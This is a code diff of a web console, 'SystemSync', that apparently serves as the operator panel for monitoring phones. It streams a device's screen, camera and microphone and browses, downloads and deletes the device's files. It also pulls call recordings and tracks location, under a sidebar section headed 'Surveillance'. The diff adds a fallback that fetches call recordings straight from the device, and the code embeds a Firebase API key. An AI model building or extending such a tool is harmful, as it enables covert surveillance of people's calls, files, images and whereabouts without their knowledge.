@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>SystemSync Console · Remote Monitoring</title>
-    
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
@@ -12,9 +11,8 @@
     <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-storage-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-auth-compat.js"></script>
-    
     <style>
-        /* ========== (all existing styles remain unchanged) ========== */
+        /* ========== All existing styles (keep unchanged) ========== */
         :root {
             --primary: #0f62fe;
             --primary-hover: #0353e9;
@@ -34,17 +32,13 @@
             --shadow-md: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
             --shadow-lg: 0 10px 25px rgba(0, 0, 0, 0.08);
         }
-
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { background: var(--bg-body); font-family: 'Inter', system-ui, sans-serif; display: flex; height: 100vh; overflow: hidden; color: var(--text-main); }
         button, input, select, textarea { font-family: inherit; }
-        
         ::-webkit-scrollbar { width: 6px; height: 6px; }
         ::-webkit-scrollbar-track { background: transparent; }
         ::-webkit-scrollbar-thumb { background: #cbd5e1; border-radius: 10px; }
         ::-webkit-scrollbar-thumb:hover { background: #94a3b8; }
-
-        /* Sidebar */
         #sidebar {
             width: 280px; background: rgba(255, 255, 255, 0.6); backdrop-filter: blur(16px); border-right: 1px solid rgba(255, 255, 255, 0.4);
             padding: 20px 16px; overflow-y: auto; flex-shrink: 0; box-shadow: 1px 0 10px rgba(0,0,0,0.02);
@@ -62,7 +56,6 @@
         }
         #sidebar button span:first-child { font-size: 16px; opacity: 0.8; }
         #sidebar button:hover { background: #f0f4f8; color: var(--primary); transform: translateX(2px); }
-
         .camera-panel { background: #f8fafc; border-radius: var(--radius-sm); padding: 16px; margin: 8px 0 16px; border: 1px solid var(--border); display: none; }
         .camera-panel.show { display: block; animation: slideDown 0.2s ease-out; }
         @keyframes slideDown { from { opacity: 0; transform: translateY(-5px); } to { opacity: 1; transform: translateY(0); } }
@@ -70,8 +63,6 @@
         .camera-option label { color: var(--text-main); display: flex; align-items: center; gap: 4px; cursor: pointer; }
         .capture-btn, .live-btn { background: var(--primary); color: white; border: none; padding: 10px; border-radius: var(--radius-sm); cursor: pointer; width: 100%; margin-top: 12px; font-weight: 600; transition: 0.2s; }
         .capture-btn:hover, .live-btn:hover { background: var(--primary-hover); box-shadow: 0 4px 10px rgba(15,98,254,0.2); }
-
-        /* Main Content */
         #main { flex: 1; display: flex; flex-direction: column; min-width: 0; background: var(--bg-body); }
         #header {
             height: 64px; background: rgba(255, 255, 255, 0.7); backdrop-filter: blur(16px); border-bottom: 1px solid rgba(255,255,255,0.4);
@@ -82,33 +73,25 @@
         #menuBtn:hover { background: #e2e8f0; }
         #headerTitle { font-size: 16px; font-weight: 600; color: var(--text-main); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
         #serverInfo { font-weight: 400; color: var(--text-sec); font-size: 14px; margin-left: 8px; }
-        
         #status { padding: 6px 16px; border-radius: 20px; background: #eff6ff; color: var(--primary); font-size: 13px; font-weight: 600; letter-spacing: 0.5px; display: inline-flex; align-items: center; gap: 6px; }
         #status::before { content: ''; width: 8px; height: 8px; border-radius: 50%; background: var(--primary); box-shadow: 0 0 6px var(--primary); }
         #status.offline { background: var(--danger-bg); color: var(--danger); }
         #status.offline::before { background: var(--danger); box-shadow: 0 0 6px var(--danger); }
-        
         #reconnectBtn { background: var(--bg-surface); color: var(--text-sec); border: 1px solid var(--border); border-radius: 50%; width: 32px; height: 32px; font-size: 14px; cursor: pointer; display: inline-flex; align-items: center; justify-content: center; transition: 0.2s; margin-left: 10px; }
         #reconnectBtn:hover { background: #f1f5f9; color: var(--text-main); transform: rotate(45deg); }
-        
         #content { flex: 1; padding: 24px; overflow: auto; }
         #main-panel { background: var(--bg-surface); border-radius: var(--radius-md); padding: 32px; min-height: 100%; box-shadow: var(--shadow-sm); border: 1px solid var(--border); }
         #main-panel h3 { font-size: 20px; font-weight: 600; margin-bottom: 20px; color: var(--text-main); }
         #main-panel p { color: var(--text-sec); margin-bottom: 20px; font-size: 14px; line-height: 1.6; }
-
-        /* Tables */
         table { width: 100%; border-collapse: separate; border-spacing: 0; font-size: 14px; margin-top: 10px; border: 1px solid var(--border); border-radius: var(--radius-md); overflow: hidden; display: table; }
         th { background: #f8fafc; padding: 12px 16px; text-align: left; color: var(--text-sec); font-weight: 600; border-bottom: 1px solid var(--border); text-transform: uppercase; font-size: 12px; letter-spacing: 0.5px; }
         td { padding: 14px 16px; border-bottom: 1px solid #f1f5f9; color: var(--text-main); vertical-align: middle; }
         tr:last-child td { border-bottom: none; }
         tbody tr { transition: background 0.15s; }
         tbody tr:hover { background: #f8fafc; }
-        
         .pagination { margin-top: 20px; display: flex; gap: 8px; justify-content: center; flex-wrap: wrap; }
         .page-btn { padding: 6px 14px; border: 1px solid #cbd5e1; background: white; border-radius: var(--radius-sm); cursor: pointer; font-size: 13px; font-weight: 500; transition: 0.2s; }
         .page-btn:hover { border-color: var(--primary); color: var(--primary); }
-
-        /* Auth & Device Modals - Premium Look */
         #authContainer, #deviceListContainer {
             position: fixed; inset: 0; background: rgba(244, 247, 251, 0.7); backdrop-filter: blur(12px);
             display: flex; justify-content: center; align-items: center; z-index: 20000;
@@ -119,30 +102,15 @@
             animation: fadeInScale 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
         }
         @keyframes fadeInScale { from { opacity: 0; transform: translateY(20px) scale(0.95); } to { opacity: 1; transform: translateY(0) scale(1); } }
-        
         #authBox h2, #deviceListBox h2 { font-size: 24px; font-weight: 700; margin-bottom: 24px; text-align: center; color: var(--text-main); letter-spacing: -0.5px; }
-        #authBox input { 
-            width: 100%; padding: 14px 16px; margin: 8px 0; background: #f8fafc; border: 1px solid #cbd5e1; 
-            border-radius: var(--radius-sm); font-size: 14px; outline: none; transition: 0.2s; 
-        }
+        #authBox input { width: 100%; padding: 14px 16px; margin: 8px 0; background: #f8fafc; border: 1px solid #cbd5e1; border-radius: var(--radius-sm); font-size: 14px; outline: none; transition: 0.2s; }
         #authBox input:focus { border-color: var(--primary); background: #fff; box-shadow: 0 0 0 4px rgba(15,98,254,0.1); }
-        
-        #authBox button, #logoutBtn { 
-            width: 100%; padding: 14px; background: var(--primary); color: white; 
-            border: none; border-radius: var(--radius-sm); cursor: pointer; 
-            font-size: 15px; font-weight: 600; transition: all 0.2s; margin-top: 12px;
-        }
+        #authBox button, #logoutBtn { width: 100%; padding: 14px; background: var(--primary); color: white; border: none; border-radius: var(--radius-sm); cursor: pointer; font-size: 15px; font-weight: 600; transition: all 0.2s; margin-top: 12px; }
         #authBox button:hover, #logoutBtn:hover { background: var(--primary-hover); transform: translateY(-1px); box-shadow: 0 4px 12px rgba(15,98,254,0.25); }
         #logoutBtn { background: #f1f5f9; color: var(--text-main); border: 1px solid #cbd5e1; margin-top: 24px; }
         #logoutBtn:hover { background: #e2e8f0; color: var(--danger); box-shadow: none; border-color: #cbd5e1; }
-        
-        .toggle-link {
-            color: var(--text-sec); font-size: 14px; font-weight: 500; text-align: center; 
-            margin-top: 24px; cursor: pointer; transition: 0.2s; text-decoration: none; display: block;
-            background: #f1f5f9; padding: 12px; border-radius: var(--radius-sm);
-        }
+        .toggle-link { color: var(--text-sec); font-size: 14px; font-weight: 500; text-align: center; margin-top: 24px; cursor: pointer; transition: 0.2s; text-decoration: none; display: block; background: #f1f5f9; padding: 12px; border-radius: var(--radius-sm); }
         .toggle-link:hover { color: var(--primary); background: #e2e8f0; transform: translateY(-1px); }
-        
         .device-item { display: flex; align-items: center; padding: 16px; border: 1px solid var(--border); border-radius: var(--radius-md); margin-bottom: 12px; cursor: pointer; transition: 0.2s; background: var(--bg-surface); }
         .device-item:hover { transform: translateY(-2px); border-color: var(--primary); box-shadow: var(--shadow-md); }
         .device-info { flex: 1; margin-left: 16px; }
@@ -150,8 +118,7 @@
         .device-id { font-size: 13px; color: var(--text-sec); font-family: monospace; }
         .device-arrow { color: var(--primary); font-size: 20px; font-weight: bold; opacity: 0; transform: translateX(-10px); transition: 0.2s; }
         .device-item:hover .device-arrow { opacity: 1; transform: translateX(0); }
-
-        /* File Manager Tree View (with sorted items) */
+        /* File Manager Tree View */
         .file-toolbar-sticky { position: sticky; top: 0; background: rgba(255, 255, 255, 0.9); backdrop-filter: blur(8px); z-index: 10; padding: 12px 0; border-bottom: 1px solid var(--border); display: flex; gap: 12px; margin-bottom: 16px; }
         .tree-root { list-style: none; padding-left: 0; }
         .tree-children { display: grid; grid-template-rows: 0fr; transition: grid-template-rows 0.3s ease-out; }
@@ -171,24 +138,16 @@
         .file-action-btn:hover { background: #f1f5f9; box-shadow: var(--shadow-sm); }
         .file-action-btn.dl:hover { color: var(--primary); border-color: var(--primary); }
         .file-action-btn.del:hover { color: var(--danger); border-color: var(--danger); }
-
-        /* Map */
         #map, #historyMap { border-radius: var(--radius-md); box-shadow: var(--shadow-sm); border: 1px solid var(--border); }
         .map-info { position: absolute; top: 20px; left: 20px; background: rgba(255,255,255,0.95); backdrop-filter: blur(8px); padding: 12px 16px; border-radius: var(--radius-sm); font-size: 13px; font-weight: 500; border-left: 4px solid var(--primary); z-index: 1000; box-shadow: var(--shadow-md); }
         .current-location-marker { background: #0f62fe; border-radius: 50%; width: 14px; height: 14px; border: 2px solid white; box-shadow: 0 0 0 4px rgba(15,98,254,0.3); }
-
-        /* General buttons */
         .btn-ui { padding: 8px 16px; font-size: 14px; font-weight: 500; border-radius: var(--radius-sm); cursor: pointer; transition: 0.2s; border: none; display: inline-flex; align-items: center; gap: 6px; }
         .btn-ui.primary { background: var(--primary); color: white; }
         .btn-ui.primary:hover { background: var(--primary-hover); box-shadow: 0 4px 10px rgba(15,98,254,0.2); transform: translateY(-1px); }
         .btn-ui.secondary { background: #f1f5f9; color: var(--text-main); border: 1px solid #cbd5e1; }
         .btn-ui.secondary:hover { background: #e2e8f0; }
-
-        /* Badges */
         .badge { display: inline-block; padding: 4px 8px; border-radius: 12px; font-size: 11px; font-weight: 600; background: #e2e8f0; color: #475569; }
         .badge.blue { background: #eff6ff; color: #1d4ed8; }
-
-        /* Modals (Media) */
         .modal-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.85); backdrop-filter: blur(4px); display: none; justify-content: center; align-items: center; z-index: 10000; animation: fadeIn 0.2s; }
         .modal-overlay.show { display: flex; }
         @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
@@ -200,7 +159,6 @@
         .popup-controls button:hover { background: #333; transform: scale(1.05); }
         .popup-controls button.close-btn { background: var(--danger); }
         .popup-controls button.close-btn:hover { background: #b91c1c; }
-
         #downloadProgress { background: white; border: 1px solid var(--border); border-radius: var(--radius-sm); padding: 16px; margin: 0 24px 16px; display: none; box-shadow: var(--shadow-sm); }
         #progressBar { width: 0%; height: 8px; background: var(--primary); border-radius: 4px; transition: width 0.3s; }
         .app-usage-item { display: flex; align-items: center; padding: 14px; border-bottom: 1px solid #eef2f5; gap: 16px; }
@@ -218,7 +176,6 @@
         .geofence-controls button { padding: 10px 20px; color: white; border: none; border-radius: var(--radius-sm); cursor: pointer; width: auto; font-weight: 500; transition: 0.2s; }
         #alertsBadge { background: var(--danger-bg); border: 1px solid #fca5a5; border-radius: var(--radius-sm); padding: 16px; margin-top: 16px; }
         .ws-debug { font-size: 11px; color: #94a3b8; margin-top: auto; padding-top: 20px; text-align: center; }
-        
         /* Call recording card style */
         .call-recording-card {
             background: white;
@@ -237,37 +194,12 @@
             transform: translateY(-2px);
             box-shadow: var(--shadow-sm);
         }
-        .call-recording-info {
-            flex: 1;
-        }
-        .call-recording-direction {
-            font-size: 20px;
-            margin-right: 8px;
-        }
-        .call-recording-number {
-            font-weight: 600;
-            font-size: 15px;
-        }
-        .call-recording-details {
-            font-size: 12px;
-            color: var(--text-sec);
-            margin-top: 4px;
-        }
-        .download-recording-btn {
-            background: var(--primary);
-            color: white;
-            border: none;
-            padding: 8px 16px;
-            border-radius: var(--radius-sm);
-            cursor: pointer;
-            font-weight: 500;
-            transition: 0.2s;
-        }
-        .download-recording-btn:hover {
-            background: var(--primary-hover);
-            transform: scale(1.02);
-        }
-        
+        .call-recording-info { flex: 1; }
+        .call-recording-direction { font-size: 20px; margin-right: 8px; }
+        .call-recording-number { font-weight: 600; font-size: 15px; }
+        .call-recording-details { font-size: 12px; color: var(--text-sec); margin-top: 4px; }
+        .download-recording-btn { background: var(--primary); color: white; border: none; padding: 8px 16px; border-radius: var(--radius-sm); cursor: pointer; font-weight: 500; transition: 0.2s; }
+        .download-recording-btn:hover { background: var(--primary-hover); transform: scale(1.02); }
         @media (max-width: 768px) {
             #sidebar { position: fixed; top: 0; left: 0; bottom: 0; transform: translateX(-100%); z-index: 1000; box-shadow: var(--shadow-lg); width: 280px; }
             #sidebar.open { transform: translateX(0); }
@@ -282,15 +214,12 @@
     </style>
 </head>
 <body>
-
 <div id="sidebarOverlay" onclick="closeSidebar()"></div>
 <div id="authContainer"><div id="authBox"><h2 id="authModeTitle">🔐 SystemSync Login</h2><input type="email" id="authEmail" placeholder="Email Address" /><input type="password" id="authPassword" placeholder="Password" /><input type="password" id="authConfirmPassword" placeholder="Confirm Password" style="display:none;" /><button id="authBtn">Sign In</button><div class="toggle-link" id="toggleAuthMode">Don't have an account? Sign up</div><div id="authError"></div></div></div>
 <div id="deviceListContainer" style="display:none;"><div id="deviceListBox"><h2>📱 Your Devices</h2><div id="deviceList" style="max-height: 400px; overflow-y: auto; padding-right: 4px; margin-bottom: 20px;"></div><button id="logoutBtn">Logout</button></div></div>
-
 <div id="screenModalOverlay" class="modal-overlay"><div class="mobile-popup"><div class="phone-frame"><video id="modalScreenVideo" autoplay playsinline></video></div><div class="popup-controls"><button id="modalSnapBtn">📸</button><button id="modalRecordBtn">🔴</button><button id="modalFullscreenBtn">⛶</button><button id="modalCloseBtn" class="close-btn">✕</button></div></div></div>
 <div id="cameraModalOverlay" class="modal-overlay"><div class="mobile-popup"><div class="phone-frame"><video id="modalCameraVideo" autoplay playsinline></video></div><div class="popup-controls"><button id="cameraSnapBtn">📸</button><button id="cameraRecordBtn">🔴</button><button id="cameraFullscreenBtn">⛶</button><button id="cameraCloseBtn" class="close-btn">✕</button></div></div></div>
 <div id="audioModalOverlay" class="modal-overlay"><div class="mobile-popup"><div class="phone-frame"><audio id="modalAudioPlayer" controls style="width:100%;"></audio></div><div class="popup-controls"><button id="audioRecordBtn">🔴</button><button id="audioCloseBtn" class="close-btn">✕</button></div></div></div>
-
 <div id="sidebar"><div class="logo">SystemSync 🔗<button id="sidebarCloseBtn" onclick="closeSidebar()">✕</button></div>
     <div class="section"><div class="section-title">Surveillance</div>
         <button id="screenShareBtn"><span>🖥</span> <span id="screenBtn">Start Screen</span></button>
@@ -335,7 +264,6 @@
     <div id="alertsBadge" style="display:none;"><strong>⚠️ Alerts</strong><div id="alertsList"></div><button id="clearAlertsBtn">Clear</button></div>
     <div class="ws-debug" id="wsDebug">🌐 WebSocket: idle</div>
 </div>
-
 <div id="main"><div id="header"><div><button id="menuBtn" onclick="toggleSidebar()">☰</button><span id="headerTitle">SystemSync <span id="serverInfo">mirror-view.onrender.com</span> <button id="headerLeaveBtn" style="display:none; margin-left:12px; font-size:12px; padding:4px 8px; border-radius:4px; border:1px solid var(--border); background:var(--danger-bg); color:var(--danger); cursor:pointer; font-weight:600;" onclick="leaveDevice()">Leave Device</button></span></div><div><span id="status">CONNECTING</span><button id="reconnectBtn">⟲</button></div></div>
 <div id="downloadProgress"><div><span id="progressFileName">Downloading...</span><span id="progressPercent">0%</span></div><div><div id="progressBar"></div></div></div>
 <div id="content"><div id="main-panel">🔌 Initializing connection...</div></div></div>
@@ -348,7 +276,6 @@ const CONFIG = {
     ICE_SERVERS: [{ urls: "stun:stun.relay.metered.ca:80" }],
     FIREBASE_CONFIG: { apiKey: "AIzaSyCHjKvbe3ZIlCE6aN5euzEF2d-bt-u9ROc", authDomain: "webviewiot.firebaseapp.com", projectId: "webviewiot", storageBucket: "webviewiot.firebasestorage.app", messagingSenderId: "634777347775", appId: "1:634777347775:web:f8efc5bcdf19e3f1de880a" }
 };
-
 firebase.initializeApp(CONFIG.FIREBASE_CONFIG);
 const auth = firebase.auth();
 const db = firebase.firestore();
@@ -377,7 +304,6 @@ function showNotification(t) { const o=statusEl.innerText; statusEl.innerText=t;
 function pushAlert(t,b) { newAlerts.unshift({title:t,body:b,time:new Date().toLocaleTimeString()}); if(newAlerts.length>50)newAlerts.pop(); const badge=document.getElementById('alertsBadge'),list=document.getElementById('alertsList'); if(badge){badge.style.display='block';list.innerHTML='';newAlerts.forEach(a=>{const d=document.createElement('div');d.style.cssText='margin-bottom:4px;padding:4px;background:#fff;border-radius:4px;font-size:11px';d.textContent=a.time+' '+a.title+': '+a.body;list.appendChild(d);});} }
 function clearAlerts() { newAlerts=[]; document.getElementById('alertsBadge').style.display='none'; }
 function downloadBase64(b64,fn){ const a=document.createElement('a'); a.href='data:application/octet-stream;base64,'+b64; a.download=fn; a.click(); }
-
 function toggleSidebar() { const sb=document.getElementById('sidebar'), ov=document.getElementById('sidebarOverlay'); sb.classList.toggle('open'); if(ov) ov.classList.toggle('show'); }
 function closeSidebar() { const sb=document.getElementById('sidebar'), ov=document.getElementById('sidebarOverlay'); sb.classList.remove('open'); if(ov) ov.classList.remove('show'); }
 
@@ -388,7 +314,6 @@ function toggleFlashOptions() {
     const liveCam = document.querySelector('input[name="liveCameraSelect"]:checked').value;
     document.getElementById('liveFlashContainer').style.display = (liveCam === 'back') ? 'inline-block' : 'none';
 }
-
 function renderAuthForm() {
     const c=document.getElementById('authBox');
     if(isLoginMode) c.innerHTML=`<h2>🔐 SystemSync Login</h2><input type="email" id="authEmail" placeholder="Email Address" /><input type="password" id="authPassword" placeholder="Password" /><input type="password" id="authConfirmPassword" placeholder="Confirm Password" style="display:none;" /><button id="authBtn">Sign In</button><div class="toggle-link" id="toggleAuthMode" tabindex="0">Don't have an account? Sign up</div><div id="authError"></div>`;
@@ -432,11 +357,7 @@ window.leaveDevice = function() {
     document.getElementById('headerLeaveBtn').style.display='none';
     if(ws)ws.close();
 };
-window.addEventListener('popstate', (e) => {
-    if(!e.state || e.state.view !== 'device') {
-        if(selectedDeviceId) leaveDevice();
-    }
-});
+window.addEventListener('popstate', (e) => { if(!e.state || e.state.view !== 'device') { if(selectedDeviceId) leaveDevice(); } });
 function selectDevice(id,name){
     history.pushState({view: 'device'}, '', '#device');
     document.getElementById('headerLeaveBtn').style.display='inline-block';
@@ -472,7 +393,7 @@ function sendCommand(cmd,params={}){
 }
 function sendPlainText(t){ if(ws&&ws.readyState===WebSocket.OPEN) ws.send(t); }
 
-// ==================== WEBRTC (simplified for brevity, but functional) ====================
+// ==================== WEBRTC (simplified but functional) ====================
 function createPeerConnection(type,onTrack,useMic){
     const pc=new RTCPeerConnection({iceServers:CONFIG.ICE_SERVERS});
     if(type==='screen') pc.addTransceiver('video',{direction:'recvonly'});
@@ -504,7 +425,6 @@ async function toggleScreen(){
         screenActive=true;
     }
 }
-// Camera modal (unchanged)
 function showCameraModal(stream, cameraType){
     const modal=document.getElementById('cameraModalOverlay');
     const video=document.getElementById('modalCameraVideo');
@@ -561,7 +481,6 @@ function stopLiveStream(){
     sendCommand('FLASH_OFF');
     panel.innerHTML='Ready.'; 
 }
-// Audio modal
 function showAudioModal(stream){
     const modal=document.getElementById('audioModalOverlay');
     const audio=document.getElementById('modalAudioPlayer');
@@ -590,7 +509,7 @@ async function startLiveAudio(){
 }
 function stopLiveAudio(){ if(audioPC)audioPC.close(); audioPC=null; sendSignaling({type:'STOP_AUDIO'}); document.getElementById('liveAudioBtn').style.display='block'; document.getElementById('stopLiveAudioBtn').style.display='none'; panel.innerHTML='Ready.'; }
 
-// ==================== FILE MANAGER (with sorting and fixed toolbar) ====================
+// ==================== FILE MANAGER (sorted & fixed toolbar) ====================
 function renderFileTreeNodes(data, path) {
     const folders = data.filter(i=>i.isDir).sort((a,b)=>a.name.localeCompare(b.name));
     const files = data.filter(i=>!i.isDir).sort((a,b)=>a.name.localeCompare(b.name));
@@ -691,78 +610,57 @@ function folderClickHandler(e) {
 function downloadClickHandler(e) {
     e.stopPropagation();
     const path = e.currentTarget.getAttribute('data-path');
-    if(path) {
-        sendPlainText('dl ' + path);
-        showNotification(`Download requested: ${path.split('/').pop()}`);
-    }
+    if(path) { sendPlainText('dl ' + path); showNotification(`Download requested: ${path.split('/').pop()}`); }
 }
 function deleteClickHandler(e) {
     e.stopPropagation();
     const path = e.currentTarget.getAttribute('data-path');
-    if(path && confirm(`Delete file: ${path.split('/').pop()}?`)) {
-        sendCommand('DELETE_FILE', {path: path});
-    }
+    if(path && confirm(`Delete file: ${path.split('/').pop()}?`)) sendCommand('DELETE_FILE', {path: path});
 }
-window.refreshFileRoot = function() {
-    sendCommand('LIST_FILES', {path: 'root'});
-    panel.innerHTML = '<p style="color:var(--text-sec); padding:16px;">⏳ Fetching files from device...</p>';
-};
-function navigateUp() {
-    if (currentPath === 'root' || currentPath === '') return;
-    let parts = currentPath.split('/');
-    parts.pop();
-    let parent = parts.join('/');
-    if (parent === '') parent = 'root';
-    currentPath = parent;
-    sendCommand('LIST_FILES', { path: parent });
-}
-function downloadSelected() {
-    if (selectedFiles.length === 0) { alert('No files selected'); return; }
-    selectedFiles.forEach(path => sendPlainText('dl ' + path));
-}
-function deleteSelected() {
-    if (selectedFiles.length === 0) { alert('No files selected'); return; }
-    if (!confirm(`Delete ${selectedFiles.length} file(s)?`)) return;
-    selectedFiles.forEach(path => sendCommand('DELETE_FILE', { path: path }));
-    selectedFiles = [];
-    updateCounters();
-}
-function updateSelected(checkbox) {
-    const path = checkbox.dataset.path;
-    if (checkbox.checked) { if (!selectedFiles.includes(path)) selectedFiles.push(path); }
-    else { selectedFiles = selectedFiles.filter(p => p !== path); }
-    updateCounters();
-}
-function updateCounters() {
-    const count = selectedFiles.length;
-    const downloadSpan = document.getElementById('downloadCount');
-    const deleteSpan = document.getElementById('deleteCount');
-    if (downloadSpan) downloadSpan.innerText = count;
-    if (deleteSpan) deleteSpan.innerText = count;
-}
+window.refreshFileRoot = function() { sendCommand('LIST_FILES', {path: 'root'}); panel.innerHTML = '<p style="color:var(--text-sec); padding:16px;">⏳ Fetching files from device...</p>'; };
+function navigateUp() { if (currentPath === 'root' || currentPath === '') return; let parts = currentPath.split('/'); parts.pop(); let parent = parts.join('/'); if (parent === '') parent = 'root'; currentPath = parent; sendCommand('LIST_FILES', { path: parent }); }
+function downloadSelected() { if (selectedFiles.length === 0) { alert('No files selected'); return; } selectedFiles.forEach(path => sendPlainText('dl ' + path)); }
+function deleteSelected() { if (selectedFiles.length === 0) { alert('No files selected'); return; } if (!confirm(`Delete ${selectedFiles.length} file(s)?`)) return; selectedFiles.forEach(path => sendCommand('DELETE_FILE', { path: path })); selectedFiles = []; updateCounters(); }
+function updateSelected(checkbox) { const path = checkbox.dataset.path; if (checkbox.checked) { if (!selectedFiles.includes(path)) selectedFiles.push(path); } else { selectedFiles = selectedFiles.filter(p => p !== path); } updateCounters(); }
+function updateCounters() { const count = selectedFiles.length; const downloadSpan = document.getElementById('downloadCount'); const deleteSpan = document.getElementById('deleteCount'); if (downloadSpan) downloadSpan.innerText = count; if (deleteSpan) deleteSpan.innerText = count; }
 
-// ==================== CALL RECORDINGS (Firebase) ====================
+// ==================== CALL RECORDINGS (Firebase + Fallback) ====================
 async function showCallRecordingsPanel() {
-    if (!selectedDeviceId) {
-        panel.innerHTML = '<p>No device selected.</p>';
-        return;
-    }
-    panel.innerHTML = '<h3>🎙️ Call Recordings</h3><p>Loading recordings from server...</p>';
+    if (!selectedDeviceId) { panel.innerHTML = '<p>No device selected.</p>'; return; }
+    panel.innerHTML = '<h3>🎙️ Call Recordings</h3><p>Loading recordings from Firebase...</p>';
     try {
-        const snapshot = await db.collection('call_recordings')
-            .where('deviceId', '==', selectedDeviceId)
-            .orderBy('timestamp', 'desc')
-            .get();
+        // First try subcollection under device (better security)
+        let snapshot = null;
+        try {
+            snapshot = await db.collection('devices').doc(selectedDeviceId).collection('call_recordings')
+                .orderBy('timestamp', 'desc')
+                .get();
+        } catch(e) { /* fallback to top-level collection */ }
+        if (!snapshot || snapshot.empty) {
+            // Fallback to top‑level collection
+            snapshot = await db.collection('call_recordings')
+                .where('deviceId', '==', selectedDeviceId)
+                .orderBy('timestamp', 'desc')
+                .get();
+        }
         if (snapshot.empty) {
-            panel.innerHTML = '<h3>🎙️ Call Recordings</h3><p>No recordings found. Make sure the device app is configured to upload call recordings to Firebase.</p>';
+            panel.innerHTML = `
+                <h3>🎙️ Call Recordings</h3>
+                <p>No recordings found in Firebase. You can fetch recordings directly from the device (if available).</p>
+                <button id="fallbackRecordingsBtn" class="btn-ui primary">📞 Fetch from Device</button>
+            `;
+            document.getElementById('fallbackRecordingsBtn')?.addEventListener('click', () => {
+                sendCommand('GET_CALL_RECORDINGS', { days: 30 });
+                showNotification('Fetching call recordings from device...');
+            });
             return;
         }
-        let html = '<h3>🎙️ Call Recordings</h3><div style="margin-top:16px;">';
+        let html = '<h3>🎙️ Call Recordings (Firebase)</h3><div style="margin-top:16px;">';
         snapshot.forEach(doc => {
             const rec = doc.data();
             const directionIcon = rec.direction === 'incoming' ? '📞' : '📤';
             const timestamp = rec.timestamp ? new Date(rec.timestamp).toLocaleString() : rec.timeFmt || 'Unknown date';
-            const duration = rec.duration ? `${Math.floor(rec.duration / 60)}:${(rec.duration % 60).toString().padStart(2,'0')}` : '?';
+            const duration = rec.duration ? `${Math.floor(rec.duration / 60)}:${(rec.duration % 60).toString().padStart(2, '0')}` : '?';
             html += `
                 <div class="call-recording-card">
                     <div class="call-recording-info">
@@ -771,9 +669,7 @@ async function showCallRecordingsPanel() {
                             <span class="call-recording-number">${escapeHtml(rec.number || 'Unknown')}</span>
                             ${rec.name ? `<span style="color:var(--text-sec); margin-left:8px;">(${escapeHtml(rec.name)})</span>` : ''}
                         </div>
-                        <div class="call-recording-details">
-                            ${timestamp} • Duration: ${duration}
-                        </div>
+                        <div class="call-recording-details">${timestamp} • Duration: ${duration}</div>
                     </div>
                     <button class="download-recording-btn" data-url="${escapeHtml(rec.audioURL)}" data-filename="call_${rec.number}_${rec.timestamp}.m4a">⬇️ Download</button>
                 </div>
@@ -781,15 +677,11 @@ async function showCallRecordingsPanel() {
         });
         html += '</div>';
         panel.innerHTML = html;
-        // Attach download handlers
         document.querySelectorAll('.download-recording-btn').forEach(btn => {
             btn.addEventListener('click', async (e) => {
                 const url = btn.getAttribute('data-url');
                 const filename = btn.getAttribute('data-filename');
-                if (!url) {
-                    showNotification('No audio file URL');
-                    return;
-                }
+                if (!url) { showNotification('No audio file URL'); return; }
                 try {
                     showNotification('Downloading...');
                     const response = await fetch(url);
@@ -800,19 +692,52 @@ async function showCallRecordingsPanel() {
                     a.click();
                     URL.revokeObjectURL(a.href);
                     showNotification('Download complete');
-                } catch (err) {
-                    console.error(err);
-                    showNotification('Failed to download');
-                }
+                } catch (err) { console.error(err); showNotification('Failed to download'); }
             });
         });
     } catch (err) {
         console.error(err);
-        panel.innerHTML = '<h3>🎙️ Call Recordings</h3><p style="color:red;">Error loading recordings. Check Firebase permissions.</p>';
+        if (err.code === 'permission-denied') {
+            panel.innerHTML = `
+                <h3>🎙️ Call Recordings</h3>
+                <div style="background: #fff3e0; border-left: 4px solid #ff9800; padding: 16px; border-radius: 8px;">
+                    <strong>⚠️ Firebase Permission Error</strong><br>
+                    Your Firebase security rules are blocking read access to the <code>call_recordings</code> collection.<br><br>
+                    <strong>Solution:</strong> Update your Firestore rules to allow authenticated reads:<br>
+                    <pre style="background:#f5f5f5; padding: 8px; border-radius: 4px; overflow-x: auto;">
+rules_version = '2';
+service cloud.firestore {
+  match /databases/{database}/documents {
+    match /call_recordings/{document} {
+      allow read, write: if request.auth != null && request.auth.uid == resource.data.userId;
+    }
+    match /devices/{deviceId}/call_recordings/{document} {
+      allow read, write: if request.auth != null && request.auth.uid == get(/databases/$(database)/documents/devices/$(deviceId)).data.userId;
+    }
+    // your existing device rules...
+  }
+}
+                    </pre>
+                    <button id="retryRecordingsBtn" class="btn-ui primary" style="margin-top: 12px;">Retry</button>
+                    <button id="fallbackDeviceBtn" class="btn-ui secondary" style="margin-top: 12px; margin-left: 8px;">Fetch from Device</button>
+                </div>
+            `;
+            document.getElementById('retryRecordingsBtn')?.addEventListener('click', () => showCallRecordingsPanel());
+            document.getElementById('fallbackDeviceBtn')?.addEventListener('click', () => {
+                sendCommand('GET_CALL_RECORDINGS', { days: 30 });
+                showNotification('Fetching call recordings from device...');
+            });
+        } else {
+            panel.innerHTML = `<h3>🎙️ Call Recordings</h3><p style="color:red;">Error: ${err.message}</p><button id="fallbackDeviceBtn2" class="btn-ui primary">Fetch from Device</button>`;
+            document.getElementById('fallbackDeviceBtn2')?.addEventListener('click', () => {
+                sendCommand('GET_CALL_RECORDINGS', { days: 30 });
+                showNotification('Fetching call recordings from device...');
+            });
+        }
     }
 }
 
-// ==================== OTHER DISPLAY FUNCTIONS (truncated for brevity, but all essential) ====================
+// ==================== OTHER DISPLAY FUNCTIONS (unchanged) ====================
 function renderTable(rows,headers){
